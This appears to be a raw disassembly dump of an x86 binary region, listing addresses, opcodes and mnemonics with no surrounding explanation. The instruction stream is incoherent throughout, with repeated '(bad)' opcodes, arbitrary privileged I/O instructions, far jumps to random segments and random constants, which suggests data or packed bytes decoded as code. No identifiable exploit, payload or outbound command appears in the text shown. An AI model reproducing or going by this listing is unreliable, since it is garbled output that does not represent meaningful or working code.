  41a3de:	inc    edx
  41a3df:	es inc ebx
  41a3e1:	out    dx,eax
  41a3e2:	mov    al,ds:0x66dd503a
  41a3e7:	inc    ecx
  41a3e8:	iret   
  41a3e9:	jmp    0x6694f5ca
  41a3ee:	dec    BYTE PTR [edx-0x14]
  41a3f1:	imul   ebx,edi,0xffffffd0
  41a3f4:	push   esi
  41a3f5:	or     ch,BYTE PTR [ebx-0x7cd476fb]
  41a3fb:	cwde   
  41a3fc:	not    BYTE PTR [ecx-0x172cd9eb]
  41a402:	jno    0x41a429
  41a404:	mov    gs,ebp
  41a406:	repz pop edi
  41a408:	or     bl,dl
  41a40a:	and    DWORD PTR [ebx],ebp
  41a40c:	(bad)  
  41a40e:	mov    eax,0x87754fb5
  41a413:	out    0x79,eax
  41a415:	cli    
  41a416:	lock add DWORD PTR [edi+0x6f],edx
  41a41a:	or     al,0x8a
  41a41c:	je     0x41a3cb
  41a41e:	xor    al,0x36
  41a421:	cli    
  41a422:	dec    edi
  41a423:	pop    ebp
  41a424:	cwde   
  41a425:	mov    ebp,0x93535d0e
  41a42a:	or     eax,0xdf9f506d
  41a42f:	imul   esp,DWORD PTR [ecx+esi*8+0x40aae9bc],0xfffffff7
  41a437:	sub    DWORD PTR [esi+edx*8-0x11d3c5db],esp
  41a43e:	(bad)  
  41a43f:	stos   DWORD PTR es:[edi],eax
  41a440:	adc    bh,BYTE PTR [edi+0x61]
  41a443:	lock fld QWORD PTR [ebp-0x38]
  41a447:	out    0x74,eax
  41a449:	fdiv   DWORD PTR [edx]
  41a44b:	mov    esp,0xbc5c9b73
  41a450:	cwde   
  41a451:	add    eax,0x406a9173
  41a456:	icebp  
  41a457:	and    al,0x8f
  41a459:	test   esi,ebx
  41a45b:	scas   al,BYTE PTR es:[edi]
  41a45c:	pop    edi
  41a45d:	jae    0x41a428
  41a45f:	push   0xffffff83
  41a461:	pop    eax
  41a462:	mov    bp,0xda53
  41a466:	popf   
  41a467:	adc    dl,cl
  41a469:	scas   eax,DWORD PTR es:[edi]
  41a46a:	repnz ins BYTE PTR es:[edi],dx
  41a46c:	adc    DWORD PTR [eax-0x3cb05a1a],0x7d
  41a473:	out    dx,al
  41a474:	fmulp  st(2),st
  41a476:	int3   
  41a477:	bound  eax,QWORD PTR [edi-0xa]
  41a47a:	add    eax,DWORD PTR [edi+eiz*1+0x17defb8c]
  41a481:	push   es
  41a482:	out    dx,eax
  41a483:	(bad)  
  41a484:	push   ecx
  41a485:	rcl    DWORD PTR [esi],0xa3
  41a488:	scas   al,BYTE PTR es:[edi]
  41a489:	adc    eax,0x886f17a5
  41a48e:	ins    DWORD PTR es:[edi],dx
  41a48f:	add    DWORD PTR [ecx+eiz*2-0x8],ecx
  41a493:	loope  0x41a49e
  41a495:	lods   eax,DWORD PTR ds:[esi]
  41a496:	add    cx,ax
  41a499:	lds    edi,FWORD PTR [eax]
  41a49b:	dec    ebp
  41a49c:	repz icebp 
  41a49e:	(bad)  
  41a49f:	(bad)
  41a4a2:	pop    esi
  41a4a3:	in     eax,dx
  41a4a4:	pusha  
  41a4a5:	dec    esi
  41a4a6:	push   0x40
  41a4a8:	cli    
  41a4a9:	int    0xa6
  41a4ab:	mov    edx,ebx
  41a4ad:	lods   al,BYTE PTR ds:[esi]
  41a4ae:	jp     0x41a515
  41a4b0:	jp     0x41a443
  41a4b2:	mov    WORD PTR [ebx+ecx*8+0x22],gs
  41a4b6:	clc    
  41a4b7:	jns    0x41a442
  41a4b9:	inc    ebp
  41a4ba:	lea    edi,[edx+0x40]
  41a4bd:	loopne 0x41a4f9
  41a4bf:	call   0xeac82d85
  41a4c4:	cmp    DWORD PTR [edi],0xedf5e54a
  41a4ca:	out    0x7d,al
  41a4cc:	leave  
  41a4cd:	jae    0x41a4af
  41a4cf:	xchg   esp,eax
  41a4d0:	lds    ebx,FWORD PTR [ecx]
  41a4d2:	mov    DWORD PTR [edi],edx
  41a4d4:	push   ebx
  41a4d5:	mov    ebp,0xde7db01e
  41a4da:	js     0x41a514
  41a4dc:	sub    eax,0x7127ec56
  41a4e1:	mov    cl,0x19
  41a4e3:	add    DWORD PTR [esi+0xb0bca05],esp
  41a4e9:	call   FWORD PTR [edi]
  41a4eb:	push   cs
  41a4ec:	dec    esi
  41a4ed:	mov    eax,0xff38281e
  41a4f2:	inc    eax
  41a4f3:	fsubr  DWORD PTR [ebp-0x34c68ae8]
  41a4f9:	test   al,0x69
  41a4fb:	pcmpgtw mm4,QWORD PTR [ecx]
  41a4fe:	adc    eax,0x95afe8e1
  41a503:	dec    ebp
  41a504:	push   eax
  41a505:	mov    eax,0x994bf634
  41a50a:	(bad)  
  41a50e:	jge    0x41a4db
  41a510:	jns    0x41a4ee
  41a512:	mov    ch,BYTE PTR [edi+edi*1-0x5f3c82de]
  41a519:	shl    esp,cl
  41a51b:	xor    eax,0x3a548c33
  41a520:	mov    bl,0x95
  41a522:	aas    
  41a523:	loop   0x41a542
  41a525:	and    ebp,DWORD PTR [edx+0x42]
  41a528:	jns    0x41a50e
  41a52a:	lahf   
  41a52b:	leave  
  41a52c:	inc    ebx
  41a52d:	pop    es
  41a52e:	lea    esp,[ebx+0x4f3a52fc]
  41a534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a535:	inc    ecx
  41a536:	pop    edx
  41a537:	dec    edi
  41a538:	nop
  41a539:	and    eax,0x16e63ce8
  41a53e:	pop    edx
  41a53f:	xchg   edx,eax
  41a540:	pop    edi
  41a541:	mov    esp,0xd7bd207a
  41a546:	mov    ebp,0x6e9f87bb
  41a54b:	hlt    
  41a54c:	adc    edi,DWORD PTR ds:0x40abfe89
  41a552:	xchg   esp,eax
  41a553:	das    
  41a554:	jb     0x41a551
  41a556:	or     ch,BYTE PTR [ecx]
  41a558:	lock mov ah,0x1a
  41a55b:	xor    DWORD PTR [eiz*4-0x4b042780],ecx
  41a562:	sbb    esi,DWORD PTR [ebp+0x18]
  41a565:	inc    ebx
  41a566:	scas   al,BYTE PTR es:[edi]
  41a567:	sub    eax,0xfd2d2e63
  41a56c:	pushf  
  41a56d:	jmp    0x1dc0:0x5372cf07
  41a574:	ror    BYTE PTR [ebp-0x59],1
  41a577:	repnz mov ah,0xb5
  41a57a:	out    dx,al
  41a57b:	mov    eax,0x8dbc7966
  41a580:	sbb    al,0x13
  41a582:	mov    dh,0xcc
  41a584:	(bad)  
  41a585:	in     al,dx
  41a586:	aad    0x5
  41a588:	jae    0x41a5f2
  41a58a:	into   
  41a58b:	fs push ss
  41a58d:	pop    eax
  41a58e:	fcom   DWORD PTR [edi+0x6e]
  41a591:	lods   eax,DWORD PTR ds:[esi]
  41a592:	aaa    
  41a593:	sahf   
  41a594:	mov    dh,0xd6
  41a596:	ret    
  41a597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a598:	and    al,0x6a
  41a59a:	aad    0x23
  41a59c:	rol    DWORD PTR ds:0xce1ca8e8,0x1e
  41a5a3:	(bad)  
  41a5a6:	pusha  
  41a5a7:	mov    ah,0x6b
  41a5a9:	pop    edi
  41a5aa:	and    BYTE PTR [ecx+0x2b8ca32b],cl
  41a5b0:	call   0x4585e667
  41a5b5:	xchg   edx,eax
  41a5b6:	mov    dh,0xc4
  41a5b8:	lds    ecx,FWORD PTR [ecx-0x36952bfa]
  41a5be:	cmp    DWORD PTR [esi+edx*1+0x6c9d9a32],ecx
  41a5c5:	lods   al,BYTE PTR ds:[esi]
  41a5c6:	inc    ebx
  41a5c7:	jne    0x41a584
  41a5c9:	fist   DWORD PTR [edx+edx*2-0x55]
  41a5cd:	gs popf 
  41a5cf:	add    BYTE PTR [edx-0x5],ah
  41a5d2:	aam    0xaf
  41a5d4:	sahf   
  41a5d5:	and    al,BYTE PTR [edi+edi*4-0x1d74340]
  41a5dc:	jmp    0xbd40:0xffa547ba
  41a5e3:	add    al,0x8
  41a5e5:	dec    edx
  41a5e6:	inc    ebx
  41a5e7:	aas    
  41a5e8:	sub    eax,0xf879fc44
  41a5ed:	test   DWORD PTR [ebp+0x5a50e10],eax
  41a5f3:	dec    eax
  41a5f4:	mov    ah,0x87
  41a5f6:	mov    BYTE PTR [edi+0x7d],dh
  41a5f9:	mov    dh,cl
  41a5fb:	nop
  41a5fc:	xor    BYTE PTR [edx-0x76],ch
  41a5ff:	imul   DWORD PTR [edx+eax*4+0x5201885d]
  41a606:	mov    al,0xe9
  41a608:	xchg   ecx,eax
  41a609:	inc    ecx
  41a60a:	in     al,dx
  41a60b:	dec    ebp
  41a60c:	dec    esi
  41a60d:	and    al,0x0
  41a60f:	mov    dl,0x6f
  41a611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a612:	jnp    0x41a5dc
  41a614:	neg    DWORD PTR [esi-0x437ceb30]
  41a61a:	inc    esp
  41a61b:	and    al,0x85
  41a61d:	mov    eax,ds:0xab483fd5
  41a622:	mov    es,WORD PTR [edx-0x66]
  41a625:	sbb    dh,BYTE PTR [eax]
  41a627:	mov    al,ds:0xcfc94871
  41a62c:	xchg   esi,eax
  41a62d:	cmp    ch,BYTE PTR [eax]
  41a62f:	mov    ch,0xdf
  41a631:	enter  0x398c,0xa
  41a635:	clc    
  41a636:	adc    ebp,DWORD PTR [eax-0x3acf3fdf]
  41a63c:	xor    eax,0xc894549f
  41a641:	adc    bh,BYTE PTR [eax-0x72]
  41a644:	mov    ch,0x90
  41a646:	or     eax,0xe6f81036
  41a64b:	call   0x8db1:0x9694951
  41a652:	jmp    0x810f:0xd6732450
  41a659:	fnstcw WORD PTR [edx+0x47074d41]
  41a65f:	fdivp  st(0),st
  41a661:	sub    al,0x49
  41a663:	rcr    BYTE PTR [ebx],0x38
  41a666:	sub    dh,al
  41a668:	lock cmp ebx,DWORD PTR [edi-0x50a35fa2]
  41a66f:	outs   dx,BYTE PTR ds:[esi]
  41a670:	mov    bl,0x22
  41a672:	adc    ch,BYTE PTR [edx]
  41a674:	sbb    eax,0xd9bb670d
  41a679:	mov    cl,0xce
  41a67b:	imul   esp,DWORD PTR [ecx],0xafeea5a2
  41a681:	dec    ebp
  41a682:	dec    edx
  41a683:	aaa    
  41a684:	clc    
  41a685:	jmp    0x6690aa42
  41a68a:	int    0x3
  41a68c:	stos   DWORD PTR es:[edi],eax
  41a68d:	ss and cl,al
  41a690:	and    al,0xef
  41a692:	shr    BYTE PTR [ebx],cl
  41a694:	jo     0x41a652
  41a696:	push   eax
  41a697:	xor    eax,0x42a137b2
  41a69c:	mov    ah,0xe
  41a69e:	jmp    0x41a679
  41a6a0:	cmp    eax,DWORD PTR [ebx-0x2fd52a46]
  41a6a6:	stos   BYTE PTR es:[edi],al
  41a6a7:	mov    al,ds:0x8cf81898
  41a6ac:	in     eax,0x7
  41a6ae:	jae    0x41a66f
  41a6b0:	xchg   ebp,eax
  41a6b1:	stc    
  41a6b2:	call   0x404b:0x8dffe01e
  41a6b9:	dec    ebx
  41a6ba:	adc    esi,DWORD PTR [edx]
  41a6bc:	jne    0x41a714
  41a6be:	jbe    0x41a685
  41a6c0:	pop    eax
  41a6c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6c2:	jle    0x41a6a3
  41a6c4:	cmc    
  41a6c5:	push   eax
  41a6c6:	div    DWORD PTR [esi+edi*1]
  41a6c9:	cli    
  41a6ca:	jmp    0xd598:0xdae0b16
  41a6d1:	jmp    0x61744617
  41a6d6:	test   bh,al
  41a6d8:	aas    
  41a6d9:	sub    al,0x68
  41a6db:	xor    ecx,DWORD PTR [eax+0x5f]
  41a6de:	iret   
  41a6df:	hlt    
  41a6e0:	loopne 0x41a694
  41a6e2:	sub    ah,cl
  41a6e4:	cs pushf 
  41a6e6:	cli    
  41a6e7:	ins    BYTE PTR es:[edi],dx
  41a6e8:	ror    ecx,cl
  41a6ea:	push   0xffffff87
  41a6ec:	dec    ebp
  41a6ed:	aaa    
  41a6ee:	add    DWORD PTR [esi],edx
  41a6f0:	pop    ss
  41a6f1:	sbb    eax,0xd4d84435
  41a6f6:	outs   dx,BYTE PTR ds:[esi]
  41a6f7:	inc    ebp
  41a6f8:	bound  esi,QWORD PTR [eax-0x64753f22]
  41a6fe:	ja     0x41a6a3
  41a700:	mov    ebp,0x5fce586
  41a705:	ja     0x41a769
  41a707:	sbb    al,0x8e
  41a709:	cmp    al,0xeb
  41a70b:	test   edx,esp
  41a70d:	in     eax,0xfa
  41a70f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a710:	je     0x41a72c
  41a712:	repnz inc eax
  41a714:	stos   BYTE PTR es:[edi],al
  41a715:	mov    al,0x1d
  41a717:	fs retf 
  41a719:	cs xor ebp,ebp
  41a71c:	inc    ebx
  41a71d:	mov    ebx,0x35f64286
  41a722:	not    ebp
  41a724:	jmp    0x44ae8177
  41a729:	out    0xdf,eax
  41a72b:	pop    edx
  41a72c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a72d:	call   0x9580bdde
  41a732:	int    0x6d
  41a734:	sub    eax,0x5d403ed9
  41a739:	fsubr  DWORD PTR [esp+ebp*4+0x6cb7fa08]
  41a740:	mov    esp,0xcc316b64
  41a745:	add    cl,al
  41a747:	lock add al,BYTE PTR [eax]
  41a74a:	or     ebx,ebx
  41a74c:	stc    
  41a74d:	aad    0x42
  41a74f:	push   ecx
  41a750:	inc    ebp
  41a751:	push   ebp
  41a752:	daa    
  41a753:	enter  0xd37e,0xae
  41a757:	cdq    
  41a758:	mov    ch,0x34
  41a75a:	adc    al,BYTE PTR [esi+0x5187954a]
  41a760:	push   eax
  41a761:	(bad)  
  41a762:	jne    0x41a7a0
  41a764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a765:	test   al,0xa6
  41a767:	repnz xor dl,cl
  41a76a:	ret    
  41a76b:	xchg   edi,eax
  41a76c:	and    ah,BYTE PTR [edi]
  41a76e:	retf   
  41a76f:	repnz mov eax,0x1201f1e0
  41a775:	ss je  0x41a777
  41a778:	int    0xfb
  41a77a:	mov    DWORD PTR [eax+0x7e],ebp
  41a77d:	test   BYTE PTR [ebx-0x5df3dc3b],bh
  41a783:	mov    al,ds:0xcd1eb57c
  41a788:	nop
  41a789:	xchg   edx,eax
  41a78a:	rcr    DWORD PTR [esi-0x7],0xe8
  41a78e:	(bad)  
  41a78f:	cs xchg ecx,eax
  41a791:	xor    DWORD PTR [edi+0x6e849938],ecx
  41a797:	xchg   BYTE PTR [edx+edx*2-0x7ac22182],cl
  41a79e:	inc    bh
  41a7a0:	push   edx
  41a7a1:	add    eax,eax
  41a7a3:	test   eax,0xfc7be114
  41a7a8:	aam    0xf2
  41a7aa:	not    DWORD PTR [ecx+0x7ed522f2]
  41a7b0:	daa    
  41a7b1:	sbb    al,0x3c
  41a7b3:	mov    ecx,0x377b8769
  41a7b8:	dec    ecx
  41a7b9:	dec    edi
  41a7ba:	fisubr WORD PTR [edx+ebx*1-0x1e]
  41a7be:	mov    ch,BYTE PTR [esi-0x55]
  41a7c1:	aaa    
  41a7c2:	cwde   
  41a7c3:	ret    
  41a7c4:	jo     0x41a818
  41a7c6:	and    DWORD PTR [esi+esi*1-0x7a],esi
  41a7ca:	fadd   QWORD PTR [ebx+0x66]
  41a7cd:	ret    
  41a7ce:	and    ecx,ebp
  41a7d0:	das    
  41a7d1:	ss mov ch,0xf4
  41a7d4:	mov    bl,0x48
  41a7d6:	jne    0x41a77f
  41a7d8:	xchg   BYTE PTR [ecx+0x1e],bh
  41a7db:	fbld   TBYTE PTR [edx-0x4dcfb597]
  41a7e1:	pop    es
  41a7e2:	mov    dl,0x27
  41a7e4:	shr    DWORD PTR [ecx+0x19],0x8b
  41a7e8:	or     BYTE PTR [edx-0x19],ch
  41a7eb:	sahf   
  41a7ec:	pop    esi
  41a7ed:	repnz and al,BYTE PTR [ebp+0x786eb449]
  41a7f4:	push   edi
  41a7f5:	out    0x2e,eax
  41a7f7:	or     al,0xa4
  41a7f9:	in     eax,0x7a
  41a7fb:	sub    dl,bl
  41a7fd:	mov    esi,0x5e3893e6
  41a802:	fsub   QWORD PTR [eax+esi*1+0x5652f180]
  41a809:	dec    edi
  41a80a:	scas   al,BYTE PTR es:[edi]
  41a80b:	popf   
  41a80c:	jle    0x41a850
  41a80e:	dec    esi
  41a80f:	jne    0x41a85c
  41a811:	and    BYTE PTR [esi],dl
  41a813:	test   al,0x8e
  41a815:	push   es
  41a816:	(bad)  
  41a817:	lods   al,BYTE PTR ds:[esi]
  41a818:	ret    
  41a819:	mov    esi,0xd31b15bd
  41a81e:	pop    esi
  41a81f:	loopne 0x41a7db
  41a821:	and    al,0x5f
  41a823:	jmp    0x41a7e7
  41a825:	in     al,dx
  41a826:	jecxz  0x41a8a1
  41a828:	jbe    0x41a7e2
  41a82a:	repz scas al,BYTE PTR es:[edi]
  41a82c:	adc    ah,BYTE PTR [eax-0x58]
  41a82f:	jno    0x41a84f
  41a831:	cwde   
  41a832:	imul   eax,DWORD PTR [esi],0xfffffff5
  41a835:	int3   
  41a836:	xor    eax,0x469df53e
  41a83b:	push   esi
  41a83c:	xchg   BYTE PTR [esi+0x83ab8d4],ch
  41a842:	adc    edx,DWORD PTR [ebp+0xa]
  41a845:	aaa    
  41a846:	loop   0x41a7eb
  41a848:	mov    ch,dl
  41a84a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a84b:	jl     0xc8d5f4c
  41a851:	sbb    ah,ah
  41a853:	push   0x68
  41a855:	xchg   esi,eax
  41a856:	cs addr16 jo 0x41a88d
  41a85a:	inc    edx
  41a85b:	mov    bl,0xa7
  41a85d:	jns    0x41a8c1
  41a85f:	xchg   edx,eax
  41a860:	dec    ecx
  41a861:	adc    al,0xe6
  41a863:	and    DWORD PTR [esi+0x25],edx
  41a866:	jle    0x41a80e
  41a868:	pop    ss
  41a869:	jmp    0x328bfc7c
  41a86e:	sub    al,0x9
  41a870:	inc    ebp
  41a871:	pop    esp
  41a872:	add    ebp,DWORD PTR [esp+edx*4+0x9ccc951]
  41a879:	mov    bl,0x76
  41a87b:	push   edi
  41a87c:	or     al,0x3
  41a87e:	iret   
  41a87f:	add    al,0xe
  41a881:	mov    edx,0x771a0aca
  41a886:	inc    esi
  41a887:	ret    
  41a888:	enter  0xb4c3,0x50
  41a88c:	cmp    DWORD PTR [eax+0x53a7e717],ebx
  41a892:	xchg   ebx,eax
  41a893:	xor    dh,dl
  41a895:	sub    al,cl
  41a897:	push   es
  41a898:	or     al,0x9d
  41a89a:	mov    edx,0xb06ad5a1
  41a89f:	jae    0x41a824
  41a8a1:	sti    
  41a8a2:	mov    ds:0xe88a31e9,al
  41a8a7:	fwait
  41a8a8:	sar    BYTE PTR [ecx-0x5704a290],cl
  41a8ae:	push   esi
  41a8af:	iret   
  41a8b0:	and    ah,ah
  41a8b2:	ins    BYTE PTR es:[edi],dx
  41a8b3:	das    
  41a8b4:	push   cs
  41a8b5:	or     cl,BYTE PTR [ebp+0x6efa7650]
  41a8bb:	jecxz  0x41a900
  41a8bd:	xor    eax,0x3e6d309f
  41a8c2:	sub    DWORD PTR [edi+0x21],esp
  41a8c5:	in     eax,dx
  41a8c6:	add    eax,0x6e97ebfb
  41a8cb:	popa   
  41a8cc:	push   ecx
  41a8cd:	push   ebx
  41a8ce:	jg     0x41a88e
  41a8d0:	xchg   edx,eax
  41a8d1:	inc    DWORD PTR [esi+0x141eb939]
  41a8d7:	pop    ebx
  41a8d8:	jg     0x41a894
  41a8da:	mul    BYTE PTR [eax-0xc]
  41a8dd:	int3   
  41a8de:	sub    DWORD PTR [ebx-0x3c71b843],ecx
  41a8e4:	or     al,0xab
  41a8e6:	outs   dx,BYTE PTR ds:[esi]
  41a8e7:	sahf   
  41a8e8:	dec    esp
  41a8e9:	retf   0xbc43
  41a8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8ed:	cmp    ebp,DWORD PTR [ecx+0x6ceefa86]
  41a8f3:	dec    esp
  41a8f4:	daa    
  41a8f5:	js     0x41a956
  41a8f7:	pop    ebx
  41a8f8:	xchg   ecx,eax
  41a8f9:	mov    bl,0xf5
  41a8fb:	sub    al,0xab
  41a8fd:	data16 arpl WORD PTR [edi+0x24],sp
  41a901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a902:	mov    edi,0x9beecdeb
  41a907:	xchg   ebp,eax
  41a908:	jmp    0x41a8a8
  41a90a:	push   ebp
  41a90b:	xor    ebx,esp
  41a90d:	dec    edi
  41a90e:	sub    cl,dl
  41a910:	mov    esp,DWORD PTR [edi-0xfea1b42]
  41a916:	jo     0x41a922
  41a918:	jns    0x41a8f3
  41a91a:	pop    esp
  41a91b:	dec    esi
  41a91c:	test   al,0x28
  41a91e:	cmp    DWORD PTR [ebp-0x73],eax
  41a921:	dec    ebx
  41a922:	pushf  
  41a923:	out    dx,eax
  41a924:	sar    al,1
  41a926:	in     eax,dx
  41a927:	enter  0x4060,0xe5
  41a92b:	jae    0x41a915
  41a92d:	mov    dh,0xa0
  41a92f:	inc    esi
  41a930:	xor    BYTE PTR [ecx+0x639f1a1d],dh
  41a936:	mov    eax,DWORD PTR [edi-0x1c]
  41a939:	aam    0x1b
  41a93b:	and    ah,BYTE PTR [ecx]
  41a93d:	mov    esi,0x34205b9b
  41a942:	gs out dx,al
  41a944:	mov    ch,0x9f
  41a946:	xor    BYTE PTR [ecx+0x30],ch
  41a949:	ret    
  41a94a:	js     0x41a9b2
  41a94c:	test   BYTE PTR [ebx],al
  41a94e:	xchg   edx,eax
  41a94f:	dec    esi
  41a950:	fldenv [edi+0x4517c416]
  41a956:	fld    QWORD PTR [ebx]
  41a958:	jb     0x41a9ba
  41a95a:	scas   eax,DWORD PTR es:[edi]
  41a95b:	ror    BYTE PTR [eax-0x13],1
  41a95e:	sub    edi,DWORD PTR [ebp-0x40]
  41a961:	je     0x41a944
  41a963:	mov    ecx,0x89015a69
  41a968:	inc    ecx
  41a969:	jl     0x41a9bc
  41a96b:	dec    esp
  41a96c:	jge    0x41a988
  41a96e:	inc    esp
  41a96f:	sub    dl,BYTE PTR ds:0x7f71fd7f
  41a975:	pusha  
  41a976:	rcr    DWORD PTR [ebp+0x5b],1
  41a979:	inc    ecx
  41a97a:	jne    0x41a940
  41a97c:	xchg   edi,eax
  41a97d:	adc    eax,0xfa1ba9b9
  41a982:	iret   
  41a983:	sbb    bl,0x27
  41a986:	pusha  
  41a987:	ins    DWORD PTR es:[edi],dx
  41a988:	addr16 cmp eax,0xa44224f0
  41a98e:	adc    ebp,DWORD PTR gs:[ebx+0x2bde5e9f]
  41a995:	dec    ecx
  41a996:	pop    esp
  41a997:	pop    eax
  41a998:	scas   eax,DWORD PTR es:[edi]
  41a999:	in     eax,dx
  41a99a:	push   cs
  41a99b:	push   edx
  41a99c:	mov    esi,0x696ad69
  41a9a1:	retf   
  41a9a2:	ins    DWORD PTR es:[edi],dx
  41a9a3:	(bad)  
  41a9a4:	stos   BYTE PTR es:[edi],al
  41a9a5:	fcomip st,st(7)
  41a9a7:	or     ch,bl
  41a9a9:	(bad)  
  41a9ab:	enter  0x5831,0xea
  41a9af:	jp     0x41a959
  41a9b1:	shr    DWORD PTR [edi+edx*8-0x45],cl
  41a9b5:	js     0x41a9ea
  41a9b7:	mov    eax,ds:0xf84d09c3
  41a9bc:	adc    edx,esi
  41a9be:	pop    es
  41a9bf:	dec    esi
  41a9c0:	aaa    
  41a9c1:	inc    esp
  41a9c2:	push   ecx
  41a9c3:	pop    es
  41a9c4:	dec    ecx
  41a9c5:	div    BYTE PTR [si+0x7897]
  41a9ca:	jmp    0x41a9b0
  41a9cc:	jmp    0x41a953
  41a9ce:	fs lods al,BYTE PTR cs:[esi]
  41a9d1:	test   DWORD PTR [ecx+0x6d],ebx
  41a9d4:	jb     0x41a982
  41a9d6:	test   BYTE PTR [esi-0x10],bh
  41a9d9:	and    eax,0xe4debb1d
  41a9de:	pop    esp
  41a9df:	and    al,BYTE PTR [esp+edi*1]
  41a9e2:	test   ebx,ecx
  41a9e4:	int3   
  41a9e5:	xor    eax,0xc3a4abba
  41a9ea:	ins    DWORD PTR es:[edi],dx
  41a9eb:	aam    0x96
  41a9ed:	or     al,0xa9
  41a9ef:	adc    al,0x38
  41a9f1:	jle    0x41aa40
  41a9f3:	sti    
  41a9f4:	stc    
  41a9f5:	xchg   DWORD PTR [ebx],eax
  41a9f7:	dec    esi
  41a9f8:	fwait
  41a9f9:	mov    al,0x64
  41a9fb:	je     0x41a986
  41a9fd:	das    
  41a9fe:	into   
  41a9ff:	push   ebp
  41aa00:	jmp    0x41aa5f
  41aa02:	mov    esi,0xbbefc3b7
  41aa07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa08:	sbb    BYTE PTR [ecx-0x42c8cc30],0x67
  41aa0f:	fistp  DWORD PTR [esi+0x7788d5a0]
  41aa15:	ror    DWORD PTR [edx-0x5],cl
  41aa18:	mov    ds:0xbd4c3455,eax
  41aa1d:	xor    ah,BYTE PTR [edx]
  41aa1f:	pop    ss
  41aa20:	retf   
  41aa21:	out    dx,eax
  41aa22:	xchg   esp,eax
  41aa23:	mov    ah,0x1a
  41aa25:	mov    dh,BYTE PTR [eax-0x349b836d]
  41aa2b:	jge    0x41a9b5
  41aa2d:	rcl    BYTE PTR [eax],cl
  41aa2f:	xchg   esp,eax
  41aa30:	jns    0x41aa75
  41aa32:	or     edx,DWORD PTR [edx+0xc9ceedd]
  41aa38:	mov    bl,0x73
  41aa3a:	sub    BYTE PTR [ecx+0x7205aca5],bl
  41aa40:	adc    eax,0x5b1d6c4c
  41aa45:	xor    BYTE PTR [ebx+0x9],ch
  41aa48:	dec    eax
  41aa49:	test   ebx,ebp
  41aa4b:	out    0xfd,eax
  41aa4d:	leave  
  41aa4e:	sub    DWORD PTR [edi-0x74af86eb],ecx
  41aa54:	sti    
  41aa55:	sbb    ebx,ecx
  41aa57:	or     BYTE PTR [edi+0x61db7884],dl
  41aa5d:	shl    DWORD PTR [esi],0x52
  41aa60:	popf   
  41aa61:	cmp    ch,al
  41aa63:	mov    bl,0x71
  41aa65:	mov    DWORD PTR [ecx],eax
  41aa67:	dec    ebp
  41aa68:	adc    al,0x93
  41aa6a:	add    edi,DWORD PTR [eax-0x29]
  41aa6d:	int    0x25
  41aa6f:	push   ebx
  41aa70:	int3   
  41aa71:	stos   BYTE PTR es:[edi],al
  41aa72:	mov    ebp,0x87f04d22
  41aa77:	pop    ecx
  41aa78:	stos   BYTE PTR es:[edi],al
  41aa79:	repnz loope 0x41aa10
  41aa7c:	lock mul DWORD PTR [edx-0x415e5655]
  41aa83:	mov    esi,0x58089ae5
  41aa88:	cmp    BYTE PTR [edx-0x183b8881],cl
  41aa8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa8f:	js     0x41aa94
  41aa91:	rdtsc  
  41aa93:	or     cl,BYTE PTR [eax]
  41aa95:	sub    ebp,DWORD PTR [esi+0xe]
  41aa98:	inc    ecx
  41aa99:	ret    
  41aa9a:	jmp    0x73478eab
  41aa9f:	dec    esi
  41aaa0:	fisubr WORD PTR [eax]
  41aaa2:	rcl    DWORD PTR [esi],1
  41aaa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaa5:	mov    bh,0xfe
  41aaa7:	dec    edi
  41aaa8:	push   0x57
  41aaaa:	shr    BYTE PTR ss:[edx+edx*2+0x4d],cl
  41aaaf:	scas   eax,DWORD PTR es:[edi]
  41aab0:	pop    es
  41aab1:	mov    dl,BYTE PTR [esi+0x6d263470]
  41aab7:	cmp    BYTE PTR [esi-0x77f944ef],dh
  41aabd:	ds jecxz 0x41aab8
  41aac0:	pusha  
  41aac1:	pusha  
  41aac2:	xor    esi,esi
  41aac4:	pop    edi
  41aac5:	test   dl,ah
  41aac7:	int    0x7e
  41aac9:	jo     0x41aa7e
  41aacb:	pop    ebp
  41aacc:	sti    
  41aacd:	sub    DWORD PTR ds:0x9eebae,edx
  41aad3:	fwait
  41aad4:	mov    al,ds:0x3903741d
  41aad9:	mov    bh,BYTE PTR [ebx+0x6]
  41aadc:	out    dx,al
  41aadd:	push   cs
  41aade:	mov    bh,BYTE PTR [ebx]
  41aae0:	adc    DWORD PTR [ebp+0x4c6626b1],ecx
  41aae6:	push   ebx
  41aae7:	sub    ecx,DWORD PTR [esi-0x43799d9b]
  41aaed:	or     al,0x1d
  41aaef:	pop    ss
  41aaf0:	pop    edi
  41aaf1:	cmc    
  41aaf2:	ror    DWORD PTR [ecx-0x45],0x29
  41aaf6:	or     dl,BYTE PTR [ecx-0x37]
  41aaf9:	js     0x41aa8f
  41aafb:	and    ebp,DWORD PTR [ebp+0x78]
  41aafe:	(bad)  [edi-0x668ce70f]
  41ab04:	test   BYTE PTR [esi],ch
  41ab06:	fstp   TBYTE PTR ds:0x85235d2c
  41ab0c:	(bad)  
  41ab0d:	adc    dl,BYTE PTR [edx+0x20e04aa4]
  41ab13:	leave  
  41ab14:	aas    
  41ab15:	push   ebx
  41ab16:	jae    0x41aabd
  41ab18:	jo     0x41aaaa
  41ab1a:	add    al,0xfb
  41ab1c:	cli    
  41ab1d:	jnp    0x41aadc
  41ab1f:	call   0x20a80b8e
  41ab24:	mov    eax,ds:0xe07bdf68
  41ab29:	xor    bh,BYTE PTR [eax]
  41ab2b:	jp     0x41aba0
  41ab2d:	xchg   ecx,eax
  41ab2e:	(bad)  
  41ab2f:	xor    ah,BYTE PTR [edx-0x2d4a6af0]
  41ab35:	in     al,dx
  41ab36:	shl    ebp,1
  41ab38:	mov    ebx,0xf554af17
  41ab3d:	call   0x89ab:0xe586c641
  41ab44:	retf   0x3ecd
